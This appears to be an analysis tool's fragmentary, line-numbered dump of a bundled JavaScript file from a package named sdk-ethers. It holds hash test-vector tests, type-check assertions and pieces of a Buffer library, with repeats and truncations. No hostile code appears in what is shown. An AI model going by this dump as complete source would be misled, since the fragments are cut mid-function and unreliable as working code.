// File: tmp/tmp5m6obpc1/sdk-ethers/package/index.js
// ======================================================================
Line 4: {

var Buffer = require('safe-buffer').Buffer
var algorithms = ['sha1', 'sha224', 'sha256', 'sha384', 'sha512', 'md5', 'rmd160', 'ripemd160']
var encodings = ['hex', 'base64'] // ignore binary
var vectors = require('hash-test-vectors')
vectors.forEach(function (vector) {
  vector.ripemd160 = vector.rmd160
})
var createHash = require('./browser')

algorithms.forEach(function (algorithm) {
  test('test ' + algorithm + ' against test vectors', function (t) {
    vectors.forEach(function (obj, i) {
      var input = Buffer.from(obj.input, 'base64')
      var node = obj[algorithm]
      var js = createHash(algorithm).update(input).digest('hex')
      t.equal(js, node, algorithm + '(testVector[' + i + ']) == ' + node)
    })

    encodings.forEach(function (encoding) {
      vectors.forEach(function (obj, i) {
        var input = Buffer.from(obj.input, 'base64').toString(encoding)
        var node = obj[algorithm]
        var js = createHash(algorithm).update(input...
Line 6: var Buffer = require('safe-buffer').Buffer
Line 7: var algorithms = ['sha1', 'sha224', 'sha256', 'sha384', 'sha512', 'md5', 'rmd160', 'ripemd160']
Line 8: var encodings = ['hex', 'base64']
Line 9: var vectors = require('hash-test-vectors')
Line 13: var createHash = require('./browser')
Line 16: {
    vectors.forEach(function (obj, i) {
      var input = Buffer.from(obj.input, 'base64')
      var node = obj[algorithm]
      var js = createHash(algorithm).update(input).digest('hex')
      t.equal(js, node, algorithm + '(testVector[' + i + ']) == ' + node)
    })

    encodings.forEach(function (encoding) {
      vectors.forEach(function (obj, i) {
        var input = Buffer.from(obj.input, 'base64').toString(encoding)
        var node = obj[algorithm]
        var js = createHash(algorithm).update(input, encoding).digest('hex')
        t.equal(js, node, algorithm + '(testVector[' + i + '], ' + encoding + ') == ' + node)
      })
    })

    vectors.forEach(function (obj, i) {
      var input = Buffer.from(obj.input, 'base64')
      var node = obj[algorithm]
      var hash = createHash(algorithm)
      hash.end(input)
      var js = hash.read().toString('hex')
      t.equal(js, node, algorithm + '(testVector[' + i + ']) == ' + node)
    })

    t.end(...
Line 17: {
      var input = Buffer.from(obj.input, 'base64')
      var node = obj[algorithm]
      var js = createHash(algorithm).update(input).digest('hex')
      t.equal(js, node, algorithm + '(testVector[' + i + ']) == ' + node)
    }
Line 18: Buffer.from(obj.input, 'base64')
Line 19: var node = obj[algorithm]
Line 21: t.equal(js, node, algorithm + '(testVector[' + i + ']) == ' + node)
Line 25: {
        var input = Buffer.from(obj.input, 'base64').toString(encoding)
        var node = obj[algorithm]
        var js = createHash(algorithm).update(input, encoding).digest('hex')
        t.equal(js, node, algorithm + '(testVector[' + i + '], ' + encoding + ') == ' + node)
      }
Line 26: Buffer.from(obj.input, 'base64').toString(encoding)
Line 27: var node = obj[algorithm]
Line 29: t.equal(js, node, algorithm + '(testVector[' + i + '], ' + encoding + ') == ' + node)
Line 33: {
      var input = Buffer.from(obj.input, 'base64')
      var node = obj[algorithm]
      var hash = createHash(algorithm)
      hash.end(input)
      var js = hash.read().toString('hex')
      t.equal(js, node, algorithm + '(testVector[' + i + ']) == ' + node)
    }
Line 34: Buffer.from(obj.input, 'base64')
Line 35: var node = obj[algorithm]
Line 37: hash.end(input)
Line 38: hash.read().toString('hex')
Line 39: t.equal(js, node, algorithm + '(testVector[' + i + ']) == ' + node)
Line 42: t.end()
Line 46: {
    
assert.equal(t.isArray([]), true);
assert.equal(t.isArray({}), false);

assert.equal(t.isBoolean(null), false);
assert.equal(t.isBoolean(true), true);
assert.equal(t.isBoolean(false), true);

assert.equal(t.isNull(null), true);
assert.equal(t.isNull(undefined), false);
assert.equal(t.isNull(false), false);
assert.equal(t.isNull(), false);

assert.equal(t.isNullOrUndefined(null), true);
assert.equal(t.isNullOrUndefined(undefined), true);
assert.equal(t.isNullOrUndefined(false), false);
assert.equal(t.isNullOrUndefined(), true);

assert.equal(t.isNumber(null), false);
assert.equal(t.isNumber('1'), false);
assert.equal(t.isNumber(1), true);

assert.equal(t.isString(null), false);
assert.equal(t.isString('1'), true);
assert.equal(t.isString(1), false);

assert.equal(t.isSymbol(null), false);
assert.equal(t.isSymbol('1'), false);
assert.equal(t.isSymbol(1), false);
assert.equal(t.isSymbol(Symbol()), true);

assert.equal(t.isUndefined(null), false);...
Line 48: assert.equal(t.isArray([]), true)
Line 65: t.isNumber(null)
Line 66: t.isNumber('1')
Line 67: t.isNumber(1)
Line 69: t.isString(null)
Line 70: t.isString('1')
Line 71: t.isString(1)
Line 73: t.isSymbol(null)
Line 74: t.isSymbol('1')
Line 75: t.isSymbol(1)
Line 76: t.isSymbol(Symbol())
Line 83: t.isRegExp(null)
Line 84: t.isRegExp('1')
Line 85: t.isRegExp(new RegExp())
Line 87: t.isObject({})
Line 88: assert.equal(t.isObject([]), true)
Line 89: t.isObject(new RegExp())
Line 90: t.isObject(new Date())
Line 109: t.isBuffer(null)
Line 110: t.isBuffer({})
Line 111: t.isBuffer(new Buffer(0))
Line 120: var crypto = require('crypto')
Line 155: exports.sign(str, secret)
Line 157: sha1(val)
Line 178: var base64 = require('base64-js')
Line 179: var ieee754 = require('ieee754')
Line 180: var customInspectSymbol =
  (typeof Symbol === 'function' && typeof Symbol['for'] === 'function') // eslint-disable-line dot-notation
    ? Symbol['for']('nodejs.util.inspect.custom') // eslint-disable-line dot-notation
    : null
Line 181: typeof Symbol === 'function' && typeof Symbol['for'] === 'function' ? Symbol['for']('nodejs.util.inspect.custom') : null
Line 182: Symbol['for']('nodejs.util.inspect.custom')
Line 232: Buffer.isBuffer(this)
Line 240: Buffer.isBuffer(this)
Line 275: from(arg, encodingOrOffset, length)
Line 315: Buffer.from(valueOf, encodingOrOffset, length)
Line 321: typeof Symbol !== 'undefined' && Symbol.toPrimitive != null &&
      typeof value[Symbol.toPrimitive] === 'function'
Line 322: typeof value[Symbol.toPrimitive] === 'function'
Line 323: Buffer.from(
      value[Symbol.toPrimitive]('string'), encodingOrOffset, length
    )
Line 324: value[Symbol.toPrimitive]('string')
Line 343: from(value, encodingOrOffset, length)
Line 362: createBuffer(size)
Line 369: createBuffer(size).fill(fill, encoding)
Line 370: createBuffer(size).fill(fill)
Line 372: createBuffer(size)
Line 385: createBuffer(size < 0 ? 0 : checked(size) | 0)
Line 401: {
  if (typeof encoding !== 'string' || encoding === '') {
    encoding = 'utf8'
  }

  if (!Buffer.isEncoding(encoding)) {
    throw new TypeError('Unknown encoding: ' + encoding)
  }

  var length = byteLength(string, encoding) | 0
  var buf = createBuffer(length)

  var actual = buf.write(string, encoding)

  if (actual !== length) {
    // Writing a hex string, for example, that contains invalid characters will
    // cause everything after the first invalid character to be ignored. (e.g.
    // 'abxxcd' will be treated as 'ab')
    buf = buf.slice(0, actual)
  }

  return buf
}
Line 411: createBuffer(length)
Line 413: var actual = buf.write(string, encoding)
Line 427: createBuffer(length)
Line 428: {
    buf[i] = array[i] & 255
  }
Line 429: buf[i] = array[i] & 255
Line 467: Buffer.isBuffer(obj)
Line 469: createBuffer(len)
Line 475: obj.copy(buf, 0, 0, len)
Line 481: createBuffer(0)
Line 496: K_MAX_LENGTH.toString(16)
Line 514: Buffer.from(a, a.offset, a.byteLength)
Line 515: Buffer.from(b, b.offset, b.byteLength)
Line 516: Buffer.isBuffer(b)
Line 528: {
      x = a[i]
      y = b[i]
      break
    }
Line 529: x = a[i]
Line 530: y = b[i]
Line 571: {
      length += list[i].length
    }
Line 572: length += list[i].length
Line 578: {
    var buf = list[i]
    if (isInstance(buf, Uint8Array)) {
      if (pos + buf.length > buffer.length) {
        Buffer.from(buf).copy(buffer, pos)
      } else {
        Uint8Array.prototype.set.call(
          buffer,
          buf,
          pos
        )
      }
    } else if (!Buffer.isBuffer(buf)) {
      throw new TypeError('"list" argument must be an Array of Buffers')
    } else {
      buf.copy(buffer, pos)
    }
    pos += buf.length
  }
Line 579: var buf = list[i]
Line 582: Buffer.from(buf).copy(buffer, pos)
Line 584: Uint8Array.prototype.set.call(
          buffer,
          buf,
          pos
        )
Line 590: Buffer.isBuffer(buf)
Line 593: buf.copy(buffer, pos)
Line 600: {
  if (Buffer.isBuffer(string)) {
    return string.length
  }
  if (ArrayBuffer.isView(string) || isInstance(string, ArrayBuffer)) {
    return string.byteLength
  }
  if (typeof string !== 'string') {
    throw new TypeError(
      'The "string" argument must be one of type string, Buffer, or ArrayBuffer. ' +
      'Received type ' + typeof string
    )
  }

  var len = string.length
  var mustMatch = (arguments.length > 2 && arguments[2] === true)
  if (!mustMatch && len === 0) return 0

  // Use a for loop to avoid recursion
  var loweredCase = false
  for (;;) {
    switch (encoding) {
      case 'ascii':
      case 'latin1':
      case 'binary':
        return len
      case 'utf8':
      case 'utf-8':
        return utf8ToBytes(string).length
      case 'ucs2':
      case 'ucs-2':
      case 'utf16le':
      case 'utf-16le':
        return len * 2
      case 'hex':
        return len >>> 1
      case 'base64':
        return base64ToBytes...
Line 601: Buffer.isBuffer(string)
Line 615: var mustMatch = (arguments.length > 2 && arguments[2] === true)
Line 689: hexSlice(this, start, end)
Line 709: utf16leSlice(this, start, end)
Line 727: {
  var i = b[n]
  b[n] = b[m]
  b[m] = i
}
Line 728: var i = b[n]
Line 729: b[n] = b[m]
Line 730: b[m] = i
Line 739: swap(this, i, i + 1)
Line 750: swap(this, i, i + 3)
Line 751: swap(this, i + 1, i + 2)
Line 762: swap(this, i, i + 7)
Line 763: swap(this, i + 1, i + 6)
Line 764: swap(this, i + 2, i + 5)
Line 765: swap(this, i + 3, i + 4)
Line 780: Buffer.isBuffer(b)
Line 788: this.toString('hex', 0, max).replace(/(.{2})/g, '$1 ').trim()
Line 792: {
  Buffer.prototype[customInspectSymbol] = Buffer.prototype.inspect
}
Line 793: Buffer.prototype[customInspectSymbol] = Buffer.prototype.inspect
Line 798: Buffer.from(target, target.offset, target.byteLength)
Line 800: Buffer.isBuffer(target)
Line 849: {
      x = thisCopy[i]
      y = targetCopy[i]
      break
    }
Line 850: x = thisCopy[i]
Line 851: y = targetCopy[i]
Line 901: Buffer.from(val, encoding)
Line 905: Buffer.isBuffer(val)
Line 910: arrayIndexOf(buffer, val, byteOffset, encoding, dir)
Line 915: Uint8Array.prototype.indexOf.call(buffer, val, byteOffset)
Line 917: Uint8Array.prototype.lastIndexOf.call(buffer, val, byteOffset)
Line 920: arrayIndexOf(buffer, [val], byteOffset, encoding, dir)
Line 949: buf.readUInt16BE(i * indexSize)
Line 957: read(val, foundIndex === -1 ? 0 : i - foundIndex)
Line 970: read(arr, i + j)
Line 987: bidirectionalIndexOf(this, val, byteOffset, encoding, true)
Line 991: bidirectionalIndexOf(this, val, byteOffset, encoding, false)
Line 1011: {
    var parsed = parseInt(string.substr(i * 2, 2), 16)
    if (numberIsNaN(parsed)) return i
    buf[offset + i] = parsed
  }
Line 1012: parseInt(string.substr(i * 2, 2), 16)
Line 1014: buf[offset + i] = parsed
Line 1024: asciiToBytes(string)
Line 1047: isFinite(offset)
Line 1049: isFinite(length)
Line 1075: hexWrite(this, string, offset, length)
Line 1107: Array.prototype.slice.call(this._arr || this, 0)
Line 1119: {
  end = Math.min(buf.length, end)
  var res = []

  var i = start
  while (i < end) {
    var firstByte = buf[i]
    var codePoint = null
    var bytesPerSequence = (firstByte > 0xEF)
      ? 4
      : (firstByte > 0xDF)
          ? 3
          : (firstByte > 0xBF)
              ? 2
              : 1

    if (i + bytesPerSequence <= end) {
      var secondByte, thirdByte, fourthByte, tempCodePoint

      switch (bytesPerSequence) {
        case 1:
          if (firstByte < 0x80) {
            codePoint = firstByte
          }
          break
        case 2:
          secondByte = buf[i + 1]
          if ((secondByte & 0xC0) === 0x80) {
            tempCodePoint = (firstByte & 0x1F) << 0x6 | (secondByte & 0x3F)
            if (tempCodePoint > 0x7F) {
              codePoint = tempCodePoint
            }
          }
          break
        case 3:
          secondByte = buf[i + 1]
          thirdByte = buf[i + 2]
          if ((secondByte & 0xC0)...
Line 1121: var res = []
Line 1124: {
    var firstByte = buf[i]
    var codePoint = null
    var bytesPerSequence = (firstByte > 0xEF)
      ? 4
      : (firstByte > 0xDF)
          ? 3
          : (firstByte > 0xBF)
              ? 2
              : 1

    if (i + bytesPerSequence <= end) {
      var secondByte, thirdByte, fourthByte, tempCodePoint

      switch (bytesPerSequence) {
        case 1:
          if (firstByte < 0x80) {
            codePoint = firstByte
          }
          break
        case 2:
          secondByte = buf[i + 1]
          if ((secondByte & 0xC0) === 0x80) {
            tempCodePoint = (firstByte & 0x1F) << 0x6 | (secondByte & 0x3F)
            if (tempCodePoint > 0x7F) {
              codePoint = tempCodePoint
            }
          }
          break
        case 3:
          secondByte = buf[i + 1]
          thirdByte = buf[i + 2]
          if ((secondByte & 0xC0) === 0x80 && (thirdByte & 0xC0) === 0x80) {
            tempCodePoint = (firstByte & 0xF) ...
Line 1125: var firstByte = buf[i]
Line 1138: switch (bytesPerSequence) {
        case 1:
          if (firstByte < 0x80) {
            codePoint = firstByte
          }
          break
        case 2:
          secondByte = buf[i + 1]
          if ((secondByte & 0xC0) === 0x80) {
            tempCodePoint = (firstByte & 0x1F) << 0x6 | (secondByte & 0x3F)
            if (tempCodePoint > 0x7F) {
              codePoint = tempCodePoint
            }
          }
          break
        case 3:
          secondByte = buf[i + 1]
          thirdByte = buf[i + 2]
          if ((secondByte & 0xC0) === 0x80 && (thirdByte & 0xC0) === 0x80) {
            tempCodePoint = (firstByte & 0xF) << 0xC | (secondByte & 0x3F) << 0x6 | (thirdByte & 0x3F)
            if (tempCodePoint > 0x7FF && (tempCodePoint < 0xD800 || tempCodePoint > 0xDFFF)) {
              codePoint = tempCodePoint
            }
          }
          break
        case 4:
          secondByte = buf[i + 1]
          thirdByte = buf[i + 2]
          fo...
Line 1145: secondByte = buf[i + 1]
Line 1154: secondByte = buf[i + 1]
Line 1155: thirdByte = buf[i + 2]
Line 1164: secondByte = buf[i + 1]
Line 1165: thirdByte = buf[i + 2]
Line 1166: fourthByte = buf[i + 3]
Line 1184: res.push(codePoint >>> 10 & 0x3FF | 0xD800)
Line 1188: res.push(codePoint)
Line 1203: (_tmp_42 = String.fromCharCode)
Line 1210: (_tmp_43 = String.fromCharCode)
Line 1222: {
    ret += String.fromCharCode(buf[i] & 0x7F)
  }
Line 1223: ret += String.fromCharCode(buf[i] & 0x7F)
Line 1232: {
    ret += String.fromCharCode(buf[i])
  }
Line 1233: ret += String.fromCharCode(buf[i])
Line 1245: {
    out += hexSliceLookupTable[buf[i]]
  }
Line 1246: out += hexSliceLookupTable[buf[i]]
Line 1255: {
    res += String.fromCharCode(bytes[i] + (bytes[i + 1] * 256))
  }
Line 1256: res += String.fromCharCode(bytes[i] + (bytes[i + 1] * 256))
Line 1282: this.subarray(start, end)
Line 1298: {
  offset = offset >>> 0
  byteLength = byteLength >>> 0
  if (!noAssert) checkOffset(offset, byteLength, this.length)

  var val = this[offset]
  var mul = 1
  var i = 0
  while (++i < byteLength && (mul *= 0x100)) {
    val += this[offset + i] * mul
  }

  return val
}
Line 1303: var val = this[offset]
Line 1306: {
    val += this[offset + i] * mul
  }
Line 1307: val += this[offset + i] * mul
Line 1314: {
  offset = offset >>> 0
  byteLength = byteLength >>> 0
  if (!noAssert) {
    checkOffset(offset, byteLength, this.length)
  }

  var val = this[offset + --byteLength]
  var mul = 1
  while (byteLength > 0 && (mul *= 0x100)) {
    val += this[offset + --byteLength] * mul
  }

  return val
}
Line 1321: var val = this[offset + --byteLength]
Line 1323: {
    val += this[offset + --byteLength] * mul
  }
Line 1324: val += this[offset + --byteLength] * mul
Line 1356: ((this[offset]) |
      (this[offset + 1] << 8) |
      (this[offset + 2] << 16)) +
      (this[offset + 3] * 0x1000000)
Line 1357: this[offset + 1] << 8
Line 1358: this[offset + 2] << 16
Line 1359: this[offset + 3] * 0x1000000
Line 1367: (this[offset] * 0x1000000) +
    ((this[offset + 1] << 16) |
    (this[offset + 2] << 8) |
    this[offset + 3])
Line 1368: (this[offset + 1] << 16) |
    (this[offset + 2] << 8) |
    this[offset + 3]
Line 1369: this[offset + 2] << 8
Line 1370: this[offset + 3]
Line 1373: {
  offset = offset >>> 0
  byteLength = byteLength >>> 0
  if (!noAssert) checkOffset(offset, byteLength, this.length)

  var val = this[offset]
  var mul = 1
  var i = 0
  while (++i < byteLength && (mul *= 0x100)) {
    val += this[offset + i] * mul
  }
  mul *= 0x80

  if (val >= mul) val -= Math.pow(2, 8 * byteLength)

  return val
}
Line 1378: var val = this[offset]
Line 1381: {
    val += this[offset + i] * mul
  }
Line 1382: val += this[offset + i] * mul
Line 1391: {
  offset = offset >>> 0
  byteLength = byteLength >>> 0
  if (!noAssert) checkOffset(offset, byteLength, this.length)

  var i = byteLength
  var mul = 1
  var val = this[offset + --i]
  while (i > 0 && (mul *= 0x100)) {
    val += this[offset + --i] * mul
  }
  mul *= 0x80

  if (val >= mul) val -= Math.pow(2, 8 * byteLength)

  return val
}
Line 1398: var val = this[offset + --i]
Line 1399: {
    val += this[offset + --i] * mul
  }
Line 1400: val += this[offset + --i] * mul
Line 1416: {
  offset = offset >>> 0
  if (!noAssert) checkOffset(offset, 2, this.length)
  var val = this[offset] | (this[offset + 1] << 8)
  return (val & 0x8000) ? val | 0xFFFF0000 : val
}
Line 1419: var val = this[offset] | (this[offset + 1] << 8)
Line 1423: {
  offset = offset >>> 0
  if (!noAssert) checkOffset(offset, 2, this.length)
  var val = this[offset + 1] | (this[offset] << 8)
  return (val & 0x8000) ? val | 0xFFFF0000 : val
}
Line 1426: var val = this[offset + 1] | (this[offset] << 8)
Line 1434: (this[offset]) |
    (this[offset + 1] << 8) |
    (this[offset + 2] << 16) |
    (this[offset + 3] << 24)
Line 1435: this[offset + 1] << 8
Line 1436: this[offset + 2] << 16
Line 1437: this[offset + 3] << 24
Line 1444: (this[offset] << 24) |
    (this[offset + 1] << 16) |
    (this[offset + 2] << 8) |
    (this[offset + 3])
Line 1445: this[offset + 1] << 16
Line 1446: this[offset + 2] << 8
Line 1447: this[offset + 3]
Line 1453: ieee754.read(this, offset, true, 23, 4)
Line 1459: ieee754.read(this, offset, false, 23, 4)
Line 1465: ieee754.read(this, offset, true, 52, 8)
Line 1471: ieee754.read(this, offset, false, 52, 8)
Line 1475: Buffer.isBuffer(buf)
Line 1481: {
  value = +value
  offset = offset >>> 0
  byteLength = byteLength >>> 0
  if (!noAssert) {
    var maxBytes = Math.pow(2, 8 * byteLength) - 1
    checkInt(this, value, offset, byteLength, maxBytes, 0)
  }

  var mul = 1
  var i = 0
  this[offset] = value & 0xFF
  while (++i < byteLength && (mul *= 0x100)) {
    this[offset + i] = (value / mul) & 0xFF
  }

  return offset + byteLength
}
Line 1487: checkInt(this, value, offset, byteLength, maxBytes, 0)
Line 1492: this[offset] = value & 0xFF
Line 1493: {
    this[offset + i] = (value / mul) & 0xFF
  }
Line 1494: this[offset + i] = (value / mul) & 0xFF
Line 1501: {
  value = +value
  offset = offset >>> 0
  byteLength = byteLength >>> 0
  if (!noAssert) {
    var maxBytes = Math.pow(2, 8 * byteLength) - 1
    checkInt(this, value, offset, byteLength, maxBytes, 0)
  }

  var i = byteLength - 1
  var mul = 1
  this[offset + i] = value & 0xFF
  while (--i >= 0 && (mul *= 0x100)) {
    this[offset + i] = (value / mul) & 0xFF
  }

  return offset + byteLength
}
Line 1507: checkInt(this, value, offset, byteLength, maxBytes, 0)
Line 1512: this[offset + i] = value & 0xFF
Line 1513: {
    this[offset + i] = (value / mul) & 0xFF
  }
Line 1514: this[offset + i] = (value / mul) & 0xFF
Line 1521: {
  value = +value
  offset = offset >>> 0
  if (!noAssert) checkInt(this, value, offset, 1, 0xff, 0)
  this[offset] = (value & 0xff)
  return offset + 1
}
Line 1524: checkInt(this, value, offset, 1, 0xff, 0)
Line 1525: this[offset] = (value & 0xff)
Line 1530: {
  value = +value
  offset = offset >>> 0
  if (!noAssert) checkInt(this, value, offset, 2, 0xffff, 0)
  this[offset] = (value & 0xff)
  this[offset + 1] = (value >>> 8)
  return offset + 2
}
Line 1533: checkInt(this, value, offset, 2, 0xffff, 0)
Line 1534: this[offset] = (value & 0xff)
Line 1535: this[offset + 1] = (value >>> 8)
Line 1540: {
  value = +value
  offset = offset >>> 0
  if (!noAssert) checkInt(this, value, offset, 2, 0xffff, 0)
  this[offset] = (value >>> 8)
  this[offset + 1] = (value & 0xff)
  return offset + 2
}
Line 1543: checkInt(this, value, offset, 2, 0xffff, 0)
Line 1544: this[offset] = (value >>> 8)
Line 1545: this[offset + 1] = (value & 0xff)
Line 1550: {
  value = +value
  offset = offset >>> 0
  if (!noAssert) checkInt(this, value, offset, 4, 0xffffffff, 0)
  this[offset + 3] = (value >>> 24)
  this[offset + 2] = (value >>> 16)
  this[offset + 1] = (value >>> 8)
  this[offset] = (value & 0xff)
  return offset + 4
}
Line 1553: checkInt(this, value, offset, 4, 0xffffffff, 0)
Line 1554: this[offset + 3] = (value >>> 24)
Line 1555: this[offset + 2] = (value >>> 16)
Line 1556: this[offset + 1] = (value >>> 8)
Line 1557: this[offset] = (value & 0xff)
Line 1562: {
  value = +value
  offset = offset >>> 0
  if (!noAssert) checkInt(this, value, offset, 4, 0xffffffff, 0)
  this[offset] = (value >>> 24)
  this[offset + 1] = (value >>> 16)
  this[offset + 2] = (value >>> 8)
  this[offset + 3] = (value & 0xff)
  return offset + 4
}
Line 1565: checkInt(this, value, offset, 4, 0xffffffff, 0)
Line 1566: this[offset] = (value >>> 24)
Line 1567: this[offset + 1] = (value >>> 16)
Line 1568: this[offset + 2] = (value >>> 8)
Line 1569: this[offset + 3] = (value & 0xff)
Line 1573: {
  value = +value
  offset = offset >>> 0
  if (!noAssert) {
    var limit = Math.pow(2, (8 * byteLength) - 1)

    checkInt(this, value, offset, byteLength, limit - 1, -limit)
  }

  var i = 0
  var mul = 1
  var sub = 0
  this[offset] = value & 0xFF
  while (++i < byteLength && (mul *= 0x100)) {
    if (value < 0 && sub === 0 && this[offset + i - 1] !== 0) {
      sub = 1
    }
    this[offset + i] = ((value / mul) >> 0) - sub & 0xFF
  }

  return offset + byteLength
}
Line 1579: checkInt(this, value, offset, byteLength, limit - 1, -limit)
Line 1585: this[offset] = value & 0xFF
Line 1586: {
    if (value < 0 && sub === 0 && this[offset + i - 1] !== 0) {
      sub = 1
    }
    this[offset + i] = ((value / mul) >> 0) - sub & 0xFF
  }
Line 1590: this[offset + i] = ((value / mul) >> 0) - sub & 0xFF
Line 1596: {
  value = +value
  offset = offset >>> 0
  if (!noAssert) {
    var limit = Math.pow(2, (8 * byteLength) - 1)

    checkInt(this, value, offset, byteLength, limit - 1, -limit)
  }

  var i = byteLength - 1
  var mul = 1
  var sub = 0
  this[offset + i] = value & 0xFF
  while (--i >= 0 && (mul *= 0x100)) {
    if (value < 0 && sub === 0 && this[offset + i + 1] !== 0) {
      sub = 1
    }
    this[offset + i] = ((value / mul) >> 0) - sub & 0xFF
  }

  return offset + byteLength
}
Line 1602: checkInt(this, value, offset, byteLength, limit - 1, -limit)
Line 1608: this[offset + i] = value & 0xFF
Line 1609: {
    if (value < 0 && sub === 0 && this[offset + i + 1] !== 0) {
      sub = 1
    }
    this[offset + i] = ((value / mul) >> 0) - sub & 0xFF
  }
Line 1613: this[offset + i] = ((value / mul) >> 0) - sub & 0xFF
Line 1619: {
  value = +value
  offset = offset >>> 0
  if (!noAssert) checkInt(this, value, offset, 1, 0x7f, -0x80)
  if (value < 0) value = 0xff + value + 1
  this[offset] = (value & 0xff)
  return offset + 1
}
Line 1622: checkInt(this, value, offset, 1, 0x7f, -0x80)
Line 1624: this[offset] = (value & 0xff)
Line 1628: {
  value = +value
  offset = offset >>> 0
  if (!noAssert) checkInt(this, value, offset, 2, 0x7fff, -0x8000)
  this[offset] = (value & 0xff)
  this[offset + 1] = (value >>> 8)
  return offset + 2
}
Line 1631: checkInt(this, value, offset, 2, 0x7fff, -0x8000)
Line 1632: this[offset] = (value & 0xff)
Line 1633: this[offset + 1] = (value >>> 8)
Line 1637: {
  value = +value
  offset = offset >>> 0
  if (!noAssert) checkInt(this, value, offset, 2, 0x7fff, -0x8000)
  this[offset] = (value >>> 8)
  this[offset + 1] = (value & 0xff)
  return offset + 2
}
Line 1640: checkInt(this, value, offset, 2, 0x7fff, -0x8000)
Line 1641: this[offset] = (value >>> 8)
Line 1642: this[offset + 1] = (value & 0xff)
Line 1646: {
  value = +value
  offset = offset >>> 0
  if (!noAssert) checkInt(this, value, offset, 4, 0x7fffffff, -0x80000000)
  this[offset] = (value & 0xff)
  this[offset + 1] = (value >>> 8)
  this[offset + 2] = (value >>> 16)
  this[offset + 3] = (value >>> 24)
  return offset + 4
}
Line 1649: checkInt(this, value, offset, 4, 0x7fffffff, -0x80000000)
Line 1650: this[offset] = (value & 0xff)
Line 1651: this[offset + 1] = (value >>> 8)
Line 1652: this[offset + 2] = (value >>> 16)
Line 1653: this[offset + 3] = (value >>> 24)
Line 1657: {
  value = +value
  offset = offset >>> 0
  if (!noAssert) checkInt(this, value, offset, 4, 0x7fffffff, -0x80000000)
  if (value < 0) value = 0xffffffff + value + 1
  this[offset] = (value >>> 24)
  this[offset + 1] = (value >>> 16)
  this[offset + 2] = (value >>> 8)
  this[offset + 3] = (value & 0xff)
  return offset + 4
}
Line 1660: checkInt(this, value, offset, 4, 0x7fffffff, -0x80000000)
Line 1662: this[offset] = (value >>> 24)
Line 1663: this[offset + 1] = (value >>> 16)
Line 1664: this[offset + 2] = (value >>> 8)
Line 1665: this[offset + 3] = (value & 0xff)
Line 1674: {
  value = +value
  offset = offset >>> 0
  if (!noAssert) {
    checkIEEE754(buf, value, offset, 4, 3.4028234663852886e+38, -3.4028234663852886e+38)
  }
  ieee754.write(buf, value, offset, littleEndian, 23, 4)
  return offset + 4
}
Line 1678: checkIEEE754(buf, value, offset, 4, 3.4028234663852886e+38, -3.4028234663852886e+38)
Line 1680: ieee754.write(buf, value, offset, littleEndian, 23, 4)
Line 1692: {
  value = +value
  offset = offset >>> 0
  if (!noAssert) {
    checkIEEE754(buf, value, offset, 8, 1.7976931348623157E+308, -1.7976931348623157E+308)
  }
  ieee754.write(buf, value, offset, littleEndian, 52, 8)
  return offset + 8
}
Line 1696: checkIEEE754(buf, value, offset, 8, 1.7976931348623157E+308, -1.7976931348623157E+308)
Line 1698: ieee754.write(buf, value, offset, littleEndian, 52, 8)
Line 1712: Buffer.isBuffer(target)
Line 1742: Uint8Array.prototype.set.call(
      target,
      this.subarray(start, end),
      targetStart
    )
Line 1744: this.subarray(start, end)
Line 1803: {
      this[i] = val
    }
Line 1804: this[i] = val
Line 1807: Buffer.isBuffer(val)
Line 1809: Buffer.from(val, encoding)
Line 1815: {
      this[i + start] = bytes[i % len]
    }
Line 1816: this[i + start] = bytes[i % len]
Line 1826: var INVALID_BASE64_RE = /[^+/0-9A-Za-z-_]/g
Line 1828: {
  // Node takes equal signs as end of the Base64 encoding
  str = str.split('=')[0]
  // Node strips out invalid characters like \n and \t from the string, base64-js does not
  str = str.trim().replace(INVALID_BASE64_RE, '')
  // Node converts strings with length < 2 to ''
  if (str.length < 2) return ''
  // Node allows for non-padded base64 strings (missing trailing ===), base64-js does not
  while (str.length % 4 !== 0) {
    str = str + '='
  }
  return str
}
Line 1830: str = str.split('=')[0]
Line 1832: str.trim()
Line 1842: {
  units = units || Infinity
  var codePoint
  var length = string.length
  var leadSurrogate = null
  var bytes = []

  for (var i = 0; i < length; ++i) {
    codePoint = string.charCodeAt(i)

    // is surrogate component
    if (codePoint > 0xD7FF && codePoint < 0xE000) {
      // last char was a lead
      if (!leadSurrogate) {
        // no lead yet
        if (codePoint > 0xDBFF) {
          // unexpected trail
          if ((units -= 3) > -1) bytes.push(0xEF, 0xBF, 0xBD)
          continue
        } else if (i + 1 === length) {
          // unpaired lead
          if ((units -= 3) > -1) bytes.push(0xEF, 0xBF, 0xBD)
          continue
        }

        // valid lead
        leadSurrogate = codePoint

        continue
      }

      // 2 leads in a row
      if (codePoint < 0xDC00) {
        if ((units -= 3) > -1) bytes.push(0xEF, 0xBF, 0xBD)
        leadSurrogate = codePoint
        continue
      }

      // valid surrogate pair
      ...
Line 1847: var bytes = []
Line 1859: bytes.push(0xEF, 0xBF, 0xBD)
Line 1863: bytes.push(0xEF, 0xBF, 0xBD)
Line 1875: bytes.push(0xEF, 0xBF, 0xBD)
Line 1884: bytes.push(0xEF, 0xBF, 0xBD)
Line 1892: bytes.push(codePoint)
Line 1895: bytes.push(
        codePoint >> 0x6 | 0xC0,
        codePoint & 0x3F | 0x80
      )
Line 1901: bytes.push(
        codePoint >> 0xC | 0xE0,
        codePoint >> 0x6 & 0x3F | 0x80,
        codePoint & 0x3F | 0x80
      )
Line 1908: bytes.push(
        codePoint >> 0x12 | 0xF0,
        codePoint >> 0xC & 0x3F | 0x80,
        codePoint >> 0x6 & 0x3F | 0x80,
        codePoint & 0x3F | 0x80
      )
Line 1922: {
  var byteArray = []
  for (var i = 0; i < str.length; ++i) {
    // Node's code seems to be doing this and not & 0x7F..
    byteArray.push(str.charCodeAt(i) & 0xFF)
  }
  return byteArray
}
Line 1923: var byteArray = []
Line 1926: byteArray.push(str.charCodeAt(i) & 0xFF)
Line 1931: {
  var c, hi, lo
  var byteArray = []
  for (var i = 0; i < str.length; ++i) {
    if ((units -= 2) < 0) break

    c = str.charCodeAt(i)
    hi = c >> 8
    lo = c % 256
    byteArray.push(lo)
    byteArray.push(hi)
  }

  return byteArray
}
Line 1933: var byteArray = []
Line 1940: byteArray.push(lo)
Line 1941: byteArray.push(hi)
Line 1952: {
    if ((i + offset >= dst.length) || (i >= src.length)) break
    dst[i + offset] = src[i]
  }
Line 1954: dst[i + offset] = src[i]
Line 1979: {
      table[i16 + j] = alphabet[i] + alphabet[j]
    }
